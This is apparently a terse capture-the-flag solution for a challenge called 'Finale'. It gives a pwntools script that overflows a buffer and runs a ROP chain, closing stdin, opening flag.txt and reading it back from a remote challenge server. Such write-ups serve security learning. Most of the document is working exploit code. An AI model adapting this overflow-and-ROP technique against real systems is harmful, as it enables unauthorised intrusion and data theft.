# Finale

## Idea
*DUMP - Not a proper writeup*
Use ROP.
Close STDIN then open the flag file. It will have the file descriptor set to 0. Now use the read call that is in code and write back the buffer.
## Solution
```python
from pwn import *
context.arch = 'amd64'

pop_rdi = 0x00000000004012d6
pop_rsi = 0x00000000004012d8
pop_rbp = 0x0000000000401404

open_fn = 0x004011c4
close_fn = 0x00401164
read_1000 = 0x00401460
write_final = 0x04014e5

io = remote("134.122.106.203", 32020)

io.recvuntil(b"secret phrase:")
io.sendline(b"s34s0nf1n4l3b00")

io.recvuntil(b" luck: [")

leak = int(io.recvuntil(b"]")[:-1],16)

io.recvuntil(b"next year: ")

print(hex(leak))

payload = b'flag.txt\x00'
payload += b"A"*(64-len(payload)) + p64(leak-0x100)
# close(0)
payload += p64(pop_rdi) + p64(0) + p64(close_fn)
# open('flag.txt') # fd = 0
payload += p64(pop_rdi) + p64(leak) + p64(pop_rsi) + p64(0) + p64(open_fn)
# read @ rpb-0x40
payload += p64(pop_rbp) + p64(leak+64+8*12) + p64(read_1000) + p64(leak+64+8*12-0x20)
payload += p64(write_final)

io.sendline(payload)

io.interactive()
```